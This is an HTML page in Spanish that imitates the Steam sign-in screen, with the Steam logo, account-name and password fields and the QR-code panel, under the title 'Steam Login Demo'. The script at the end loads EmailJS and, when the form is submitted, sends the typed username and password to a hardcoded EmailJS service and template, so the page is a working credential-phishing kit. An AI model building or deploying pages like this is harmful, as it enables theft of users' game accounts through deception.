<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<title>Steam Login Demo</title>

<style>
/* ====== BASE ====== */
body {
  margin: 0;
  height: 100vh;
  background: #0e1621;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: Arial, Helvetica, sans-serif;
  color: #c6d4df;
}

/* ====== CAJA PRINCIPAL ====== */
.steam-box {
  background: #171a21;
  width: 820px;
  height: 360px;
  border-radius: 6px;
  display: flex;
  padding: 30px;
  box-sizing: border-box;
  position: relative;
}

/* ====== IZQUIERDA ====== */
.left {
  flex: 1;
}

.logo {
  text-align: center;
  margin-bottom: 15px;
}

.logo img {
  width: 120px; /* Ajusta tamaño si quieres */
}

.label {
  font-size: 12px;
  color: #66c0f4;
  margin-bottom: 5px;
}

input {
  width: 100%;
  padding: 10px;
  background: #32353c;
  border: none;
  color: white;
  margin-bottom: 15px;
  border-radius: 2px;
  outline: none;
}

.remember {
  display: flex;
  align-items: center;
  font-size: 13px;
  margin-bottom: 20px;
  color: #c6d4df;
}

button {
  width: 100%;
  padding: 12px;
  background: linear-gradient(90deg,#06bfff,#2d73ff);
  border: none;
  color: white;
  font-weight: bold;
  font-size: 15px;
  border-radius: 2px;
  cursor: pointer;
}

/* ====== DERECHA ====== */
.right {
  width: 260px;
  text-align: center;
  color: #66c0f4;
  font-size: 12px;
}

.overlay {
  position: absolute;
  inset: 0;
  background: rgba(14,22,33,0.95);
  display: none;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  border-radius: 6px;
}

.footer {
  position: absolute;
  bottom: 30px;
  font-size: 12px;
  color: #8f98a0;
}

.footer span {
  color: #66c0f4;
}
</style>
</head>

<body>

<div class="steam-box">

  <div class="left">
    <div class="logo">
      <img src="https://www.citypng.com/public/uploads/preview/steam-white-logo-hd-png-701751694706440swid9yuigf.png" alt="Logo Steam">
    </div>

    <form id="login-form">
      <div class="label">INICIA SESIÓN CON TU NOMBRE DE CUENTA</div>
      <input type="text" name="username" placeholder="Nombre de cuenta" required>

      <div class="label">CONTRASEÑA</div>
      <input type="password" name="password" placeholder="Contraseña" required>

      <div class="remember">
        <input type="checkbox" name="remember" checked style="width:auto;margin-right:8px;">
        Recordarme
      </div>

      <button type="submit">Iniciar sesión</button>
    </form>
  </div>

  <div class="right">
    <div>O BIEN CON UN CÓDIGO QR</div>
    <div style="margin-top: 10px; font-size: 12px;">
      Usa la aplicación <b>Steam Mobile</b><br>
      para iniciar sesión con un código QR
    </div>
  </div>

</div>

<div class="footer">
  <span>Ayuda, no puedo iniciar sesión</span> ·
  ¿No tienes una cuenta?
  <span>Crear una cuenta gratuita</span>
</div>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  emailjs.init('3x0styJQNXamR4XT4');

  document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = this.username.value;
    const password = this.password.value;
    const remember = this.remember.checked ? "Sí" : "No";

    emailjs.send('service_33u0mdn', 'template_vs7phvq', {
      username: username,
      password: password,
      remember: remember
    })
    .then(() => alert('Correo enviado con datos del formulario'))
    .catch(error => alert('Error al enviar correo: ' + error.text));
  });
</script>

</body>
</html>
